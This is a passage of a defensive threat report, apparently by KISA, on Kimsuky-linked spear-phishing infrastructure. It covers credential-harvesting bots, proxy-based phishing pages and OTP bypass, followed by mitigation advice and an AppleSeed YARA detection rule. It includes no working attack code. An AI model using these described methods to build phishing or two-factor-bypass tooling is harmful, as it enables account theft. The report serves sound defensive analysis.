company's login page. The\n\ndetailed operation structure for each type is described on the following pages.\n\n\n-----\n\n### A. Type A (bot program)\n\nThe first case describes the structure of collecting victim accounts using a proprietary bot program. The phishing email\n\nrecipient who clicks on the link in the email (config.php, mobile_detect.php) is directed to a page which was created to\n\nlook like the victim’s user environment, such as a login page or change password page.\n\nWhen the victim enters his or her account information on the phishing site, the attacker bot program monitoring the server\n\ncollects the information. In the type A process, the bot program logs into the account with the transmitted information\n\nand acts as the 'main axis’ for stealing information.\n\nThe procedure for collecting information through a phishing email is as follows. The information delivered from the\n\nphishing mail is sent to the index.php running on the attacker server, and each page operates organically thereafter.\n\n**[Figure 4-2] Type A phishing mail operation structure**\n\n\n-----\n\nThe account information entered by the victim is finally delivered to the bot running on the attacker's server. The bot\n\nprogram accesses the portal account with the received parameter information, steals the account, and logs in. Afterwards,\n\nit logs in through the account leaked to the attacker server and maintains the session.\n\nThe value input from the page_[ ].php page is transmitted to the attacker server (ip:port) stored in config.php through\n\npxy.php. The bot program running in the attacker server monitors port 9100 and parses the information received via the\n\nport 9100.\n\nThe information received by the bot program through the http 9100 port contains the following information, of which the\n\nfollowing operation modes can be performed through the 'type' value.\n\n**[Figure 4-3] Received information parameters**\n\n##### The modes that can be requested through DaumBot are as follows.\n\nParameter\n\nOperation mode Description\n\nvalue\n\nREQUESTTYPEACCOUNTTYPE acc Certification method\n\nREQUESTTYPEPWD pwd Login through password input, password change\n\nREQUESTTYPEVERIFYCODE verify Manage my information -> Reconfirm password\n\nREQUESTTYPEREADING reading Not used in collected bots\n\nREQUESTTYPELOG log Save logs\n\nREQUESTTYPECREATEBROWSER create Not used in collected bots\n\nREQUESTTYPECHANGEPWD chgpwd Not used in collected bots\n\nThe bot program allows the attacker's server to automatically log in to the Daum portal page through the collected\n\ninformation (id, pw, otp), and sets automatic browser login to allow the attacker to access the victim account at any time\n\nwithout credentials and secure a route to collect information.\n\nIn addition, when entering the ID through the password search function of the normal portal site using the input ID, the\n\nstring “Step 2” is checked to determine the presence of two-factor authentication.\n\n|Operation mode|Parameter value|Description|\n|---|---|---|\n|REQUESTTYPEACCOUNTTYPE|acc|Certification method|\n|REQUESTTYPEPWD|pwd|Login through password input, password change|\n|REQUESTTYPEVERIFYCODE|verify|Manage my information -> Reconfirm password|\n|REQUESTTYPEREADING|reading|Not used in collected bots|\n|REQUESTTYPELOG|log|Save logs|\n|REQUESTTYPECREATEBROWSER|create|Not used in collected bots|\n|REQUESTTYPECHANGEPWD|chgpwd|Not used in collected bots|\n\n\n-----\n\n**[Figure 4-4] Two-factor authentication verification procedure**\n\nIf two-factor authentication is enabled, the two-factor authentication OTP is requested using Selenium library and\n\nauthentication bypassing is attempted. The authentication bypass method is different for each page displayed when clicking\n\na link in a phishing email. Pages are divided by 'm=' (mode) among the parameters used for links, and there are three\n\ntypes: Verify, Login, and Edit.\n\n##### 1. Verify and Login modes\n\nVerify and Login modes impersonate security officers or customer service centers and perform phishing attacks with general\n\ncontent such as authentication or identity verification. The two modes differ only in the email content and the linked page,\n\nbut the malicious phishing page and information leakage framework operate similarly.\n\nDetails of phishing mails\n\nAccount ID conflicted. Identity verification is required.\n\nVerify [Security Notice] Abnormal login was detected\n\n[Security Notice] Check the registered mobile phone number\n\nLogin [Warning] A large amount of spam has been sent to your ‘id' ID.\n\nWhen the email is opened, the login or authentication screen is displayed as shown below. In the Verify mode, the\n\npassword reconfirmation page in 'My Information-My Information Management' is exposed, and in the Login mode, the\n\nlogin page is exposed to induce password input for the account.\n\n|Col1|Details of phishing mails|\n|---|---|\n|Verify|Account ID conflicted. Identity verification is required. [Security Notice] Abnormal login was detected [Security Notice] Check the registered mobile phone number|\n|Login|[Warning] A large amount of spam has been sent to your ‘id' ID.|\n\n\n-----\n\n**[Figure 4-5] The phishing page which leaks information when the phishing mail link is clicked**\n\n< Verify phishing page >                < Login phishing page >\n\n\n-----\n\nThe phishing page operation process is as follows, and the operation method is different depending on whether OTP is\n\nenabled.\n\n**[Figure 4-6] Verify and login operation process when OTP is enabled**\n\n**[Figure 4-7] Verify and Login operation process when OTP is disabled**\n\n\n-----\n\n##### 2. Edit mode\n\nEdit modes are distributed as email content such as \"Please change your password periodically\". When the user clicks the\n\nlink in the email, he or she is directed to the page created by the attacker which appears to be the password change page\n\nof a specific portal site, seen in th as shown in the image below. The vicitim is prompted to change his or her password.\n\n**[Figure 4-8] Phishing page which leaks information when the victim clicks on the phishing mail link**\n\nWhen entering the current password and new password on the page, the input value is transmitted to the attacker along\n\nwith the ID.\n\n**[Figure 4-9] ID and password transmission parameter**\n\n\n-----\n\nThe operation process of edit mode is as follows, and the operation method differs according whether OTP is OTP is\n\nenabled or disabled.\n\n**[Figure 4-10] when OTP is enabled**\n\n**[Figure 4-11] When OTP is disabled**\n\n\n-----\n\nIn the entire process (Verify, Login, edit) above, the smtp protocol is used to check whether the password entered in the\n\naccount for which two-factor authentication is disabled is correct.\n\n**[Figure 4-12] When two-factor authentication is not set**\n\n\n-----\n\n### B. Type B (PHProxy)\n\nThe type B phishing page was created by modifying part of the PHProxy open source. The PHProxy works like a proxy\n\nserver, and the victim can mistakenly think that he or she is accessing the actual portal site.\n\n**[Figure 4-13] Operation process of Type B impersonating phishing email**\n\nThe phproxy code is set as index.php. In addition, parameter values during communication are defined in config.php, and\n\ninformation for account interception and information on a normal page to be accessed through a proxy is passed as a\n\nfactor to the ‘u=’ value. The parameter information set for account stealing is set to vip, vcp, 0100, 1001, 1002, etc., and\n\nis linked to the page corresponding to each value according to the parameter information of the target. Depending on\n\neach received value, the user can download a specific file or be directed to the login page where their information will\n\nbe stolen.\n\n**[Figure 4-14] Parameter for phishing connection page**\n\nThe ID and password received from the victim are transferred to confirm.php, and the transferred ID and password are\n\nsaved in the log.\n\n※ Refer to 'boho.or.kr -Phishing Email Attack Case Analysis and Countermeasures'.\n\n\n-----\n\n### B. Type C (language check)\n\nThe type C phishing page is a page created by an attacker, and the page shown to the victim through the parameter values\n\nreceived from the phishing email shows English or Korean pages. It is believed that the phishing email must have been\n\ndistributed not only in Korea, but also overseas, or to domestic companies that have overseas operations, and the general\n\npublic.\n\n**[Figure 4-15] Operation process of Type C phishing email**\n\nThe parameters initially transmitted through a phishing email are as follows, and the language of the exposed page is set.\n\n**[Figure 4-16] Parameters and site for phishing connection page**\n\nTo check the two-factor authentication method, the attacker attempts to log in to the normal page through the ID\n\npassword collected through a phishing email. When attempting to log in, the two-factor authentication method is checked\n\nthrough the STP value among the values requested. If the received values contain an STP value, it is two-factor\n\nauthentication. If STP = 1, it is a basic authentication method using an ID and password.\n\nThe information received through a phishing email is saved as a log in the attacker server as follows.\n\n**[Figure 4-17] Logs for saving ID and password in the attacker server**\n\n\n-----\n\n### C. Type D (others)\n\nWhen an attacker sends a phishing email to a specific company other than the portal site, it sends a modified email tailored\n\nto the company based on the 'C type' code. In addition, the login page exposed as a phishing email is created to look\n\nthe same as the corporate login page. This phishing page is exploited as a step to leak internal documents of a company\n\nand enable initial access.\n\n**[Figure 4-18] Operation process for Type D (for specific company) phishing page and phishing email**\n\nThe parameters initially transmitted through phishing mails are as follows, and the target ID is encoded in Base64 and then\n\ntransmitted.\n\n**[Figure 4-19] Parameter and site for phishing connection page**\n\n\n-----\n\n## 5. Conclusion\n\n\n#### 【Defender‘s Insight】\n\nIn this report, the Korea Internet & Security Agency examined the preparation process for attacks such as\n\nreconnaissance and infrastructure construction of attack organizations that mainly use spear phishing.\n\nFrom previous TTP reports, we found that attackers cannot easily change their own, long-used tactics and strategies\n\nwhen accessing target companies. In addition, through this report, it was confirmed that the methods for\n\nreconnaissance and infrastructure composition cannot be easily changed, either.\n\nIn order to successfully perform an attack, the attacker collects various kinds of information such as political and\n\ncurrent issues, corporate information, as well as information about the environment and key figures of the target\n\nthrough online searches via Google and social media. The collected information is processed to carefully create\n\nphishing emails. Furthermore, attackers acquire server resources by purchasing services or hacking, and build\n\nhacking infrastructure by creating malware to be used for intrusion. This infrastructure is used to send a large\n\nvolume of phishing emails and collect account information through phishing sites. Additional bait (e.g., spoofed\n\ndocuments) is acquired from the stolen account's mailbox, and a link or malicious document containing malware\n\nis attached to induce malware infection and infiltrate the enterprise.\n\nIt is impossible for us to completely defend against attackers’ attack attempts. However, if we know the preparation\n\nprocess of attackers before they attempt an attack and establish a defense strategy appropriate for our business\n\nsituation, we will be able to delay or prevent the attack attempt.\n\nMore likely than not, most intrusion attacks in the future will continue to be made through phishing. This is because\n\nphishing attacks are often used to collect information about the targets, and intrusion through phishing shows the\n\nhighest attack success rate at the initial intrusion stage into the company. In order to successfully defend against\n\na phishing attack, employees or individuals must be the agents of defense against cyber attacks. In particular, it\n\nis necessary to check whether unnecessary information has been posted on the company's homepage or whether\n\ninformation is being uploaded indiscriminately to social media. Furthermore, defenders need to periodically search\n\nfor company information on search engines and check what information is exposed externally. For employees who\n\ninevitably have to expose their information outside the company, it is also necessary to focus on security\n\nenhancement training. In addition, defenders need to make sure that the page that requests information\n\nauthentication has a normal certificate, and develop a habit of connecting to the page through browser search\n\nrather than clicking a link.\n\nIn account management, multi-factor authentication methods such as two-step authentication and two-step channel\n\nare still valid security mechanisms. However, an attacker can bypass two-factor authentication in the manner\n\ndescribed in this report,\n\nTherefore, individual users should check whether the URL address is normal or a page has a normal certificate when\n\nlogging in to their account. In addition, it is recommended to register login enabled devices so that users can log\n\nin only from trusted devices. In the case of an email service company, it may be helpful to guide the user once\n\nmore so that the user can check the authenticity of the site (using a normal certificate, etc.) when sending a\n\ntwo-step authentication message to the user.\n\n\n-----\n\n## 6. Yara Rule\n\nrule AppleSeed\n\n{\n\nmeta:\n\n\n##### YARA Rule for remote control malware\n\n\nauthor = \"KrCERT/CC Profound Analysis Team\"\n\ndate = \"2020-12-04\"\n\ninfo = \"Operation MUZABI\"\n\nver = \"1.0\"\n\nhash1 =\"43cc6d190238e851d33066cbe9be9ac8\"\n\nhash2 =\"fd10bd6013aabadbcb9edb8a23ba7331\"\n\nhash3 =\"16231e2e8991c60a42f293e0c33ff801\"\n\nhash4 =\"89fff6645013008cda57f88639b92990\"\n\nhash5 =\"030e2f992cbc4e61f0d5c994779caf3b\"\n\nhash6 =\"3620c22671641fbf32cf496b118b85f6\"\n\nhash7 =\"4876fc88c361743a1220a7b161f8f06f\"\n\nhash8 =\"94b8a0e4356d0202dc61046e3d8bdfe0“\n\nstrings:\n\n$appleseed_str1 = {0F 8? ?? (00|01) 00 00 [0-1] 83 F? 20 0F 8? ?? (01|00) 00 00 }\n\n$appleseed_str2 = {88 45 [0-15] 0F B6 44 ?? 01}\n\n$appleseed_str3 = {83 F? 10 [0-5] 83 E? 10}\n\n$appleseed_key1 = {89 04 ?9 [0-6] FF 34 ?? E8 [10-16] 89 0C 98 8B ?? 0C [0-3] FF 34 98 }\n\n$appleseed_key2 = {83 F? 10 [0-10] 32 4C 05 ?? ?? 88 4C ?? 0F}\n\n$appleseed_key3 = {89 04 ?9 49 83 ?? 04 48 ?? ?? 10 8B 0C A8 E8 [0-10] 48 8B ?? ?8 }\n\n$seed_str1 = {44 0F B6 44 3D C0 45 32 C7 44 32 45 D4}\n\n$seed_str2 = {0F B6 44 3? ?? [0-25] 83 C4 0C}\n\n$seed_str3 = {32 45 C? ?? ?? ?? 32 45 E?}\n\ncondition:\n\nuint16(0) == 0x5A4D and filesize < 400KB and (2 of ($appleseed_str*)) and (1 of ($seed_str*)) and (1\n\nof ($appleseed_key*))\n\n}\n\nYARA is an open source tool designed to identify and classify malware samples, and can distinguish specific malware\n\nsamples through rules based on strings and binaries. Based on the explanations in the ATT&CK Matrix in Chapter\n\n3 and the detailed analysis of malware in Chapter 4, the following rules can be applied to check the malware\n\nthat exists as a file.\n\n\n-----\n\n##### How to use YARA\n\n yara [rule file] [searched file or path]\n\n - Because false positives may occur when using Yara rule, it is necessary to check and review accurate files.\n\n - Rules related to malware specified in the this report are written in the rules file attached to the post.\n\n - Instructions and download: https://virustotal.github.io/yara/\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        }
    ],
    "references": [
        "https://boho.or.kr/filedownload.do?attach_file_seq=2695&attach_file_id=EpF2695.pdf"
    ],
    "report_names": [
        "filedownload.do?attach_file_seq=2695&attach_file_id=EpF2695.pdf"
    ],
    "threat_actors": [
        {
            "id": "3f42c8f4-2cf1-4555-abff-b19852033aec",
            "created_at": "2023-11-08T02:00:07.099084Z",
            "updated_at": "2025-03-27T02:00:03.180517Z",
            "deleted_at": null,
            "main_name": "TA499",
            "aliases": [
                "Lexus",
                "Vovan"
            ],
            "source_name": "MISPGALAXY:TA499",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "dc78f675-b309-431d-8160-b8dcff037d4f",
            "created_at": "2024-05-01T02:03:08.142224Z",
            "updated_at": "2025-03-27T02:05:17.417972Z",
            "deleted_at": null,
            "main_name": "NICKEL KIMBALL",
            "aliases": [
                "Black Banshee ",
                "Crooked Pisces ",
                "Emerald Sleet ",
                "Kimsuky ",
                "Opal Sleet ",
                "SharpTongue ",
                "TA427 ",
                "THALLIUM ",
                "Velvet Chollima ",
                "APT43 "
            ],
            "source_name": "Secureworks:NICKEL KIMBALL",
            "tools": [
                " KONNI",
                " KimJongRAT",
                " Kimsuky",
                "BabyShark"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "760f2827-1718-4eed-8234-4027c1346145",
            "created_at": "2023-01-06T13:46:38.670947Z",
            "updated_at": "2025-03-27T02:00:02.888195Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "Thallium",
                "G0086",
                "APT43",
                "Springtail",
                "Sparkling Pisces",
                "Velvet Chollima",
                "Black Banshee",
                "Operation Stolen Pencil",
                "Emerald Sleet",
                "THALLIUM"
            ],
            "source_name": "MISPGALAXY:Kimsuky",
            "tools": [
                "RevClient",
                "xrat",
                "QUASARRAT",
                "RDP Wrapper",
                "TightVNC",
                "BabyShark"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "191d7f9a-8c3c-442a-9f13-debe259d4cc2",
            "created_at": "2022-10-25T15:50:23.280374Z",
            "updated_at": "2025-03-27T02:00:55.423485Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "Kimsuky",
                "Black Banshee",
                "Velvet Chollima",
                "Emerald Sleet",
                "THALLIUM",
                "APT43",
                "TA427"
            ],
            "source_name": "MITRE:Kimsuky",
            "tools": [
                "schtasks",
                "Amadey",
                "Brave Prince",
                "CSPY Downloader",
                "gh0st RAT",
                "AppleSeed",
                "NOKKI",
                "QuasarRAT",
                "Gold Dragon",
                "PsExec",
                "KGH_SPY",
                "Mimikatz",
                "BabyShark"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "71a1e16c-3ba6-4193-be62-be53527817bc",
            "created_at": "2022-10-25T16:07:23.753455Z",
            "updated_at": "2025-03-27T02:02:09.963016Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "APT 43",
                "Black Banshee",
                "Emerald Sleet",
                "ITG16",
                "KTA082",
                "Kimsuky",
                "Larva-24005",
                "Operation Baby Coin",
                "Operation Covert Stalker",
                "Operation DEEP#DRIVE",
                "Operation DEEP#GOSU",
                "Operation Kabar Cobra",
                "Operation Mystery Baby",
                "Operation Red Salt",
                "Operation Smoke Screen",
                "Operation Stealth Power",
                "Operation Stolen Pencil",
                "SharpTongue",
                "Sparkling Pisces",
                "Springtail",
                "TA406",
                "TA427",
                "Thallium",
                "UAT-5394",
                "Velvet Chollima"
            ],
            "source_name": "ETDA:Kimsuky",
            "tools": [
                "AngryRebel",
                "AppleSeed",
                "BITTERSWEET",
                "BabyShark",
                "BoBoStealer",
                "CSPY Downloader",
                "Farfli",
                "FlowerPower",
                "Gh0st RAT",
                "Ghost RAT",
                "Gold Dragon",
                "GoldDragon",
                "GoldStamp",
                "JamBog",
                "KGH Spyware Suite",
                "KGH_SPY",
                "KPortScan",
                "KimJongRAT",
                "Kimsuky",
                "LATEOP",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Lovexxx",
                "MailPassView",
                "Mechanical",
                "Mimikatz",
                "MoonPeak",
                "Moudour",
                "MyDogs",
                "Mydoor",
                "Network Password Recovery",
                "PCRat",
                "ProcDump",
                "PsExec",
                "ReconShark",
                "Remote Desktop PassView",
                "SHARPEXT",
                "SWEETDROP",
                "SmallTiger",
                "SniffPass",
                "TODDLERSHARK",
                "TRANSLATEXT",
                "Troll Stealer",
                "TrollAgent",
                "VENOMBITE",
                "WebBrowserPassView",
                "xRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716496,
    "ts_updated_at": 1743041815,
    "ts_creation_date": 1614333014,
    "ts_modification_date": 1615554821,
    "files": {
        "pdf": "https://archive.orkl.eu/8114412b6d72da76f88c7bb955cd857211f3e46d.pdf",
        "text": "https://archive.orkl.eu/8114412b6d72da76f88c7bb955cd857211f3e46d.txt",
        "img": "https://archive.orkl.eu/8114412b6d72da76f88c7bb955cd857211f3e46d.jpg"
    }
}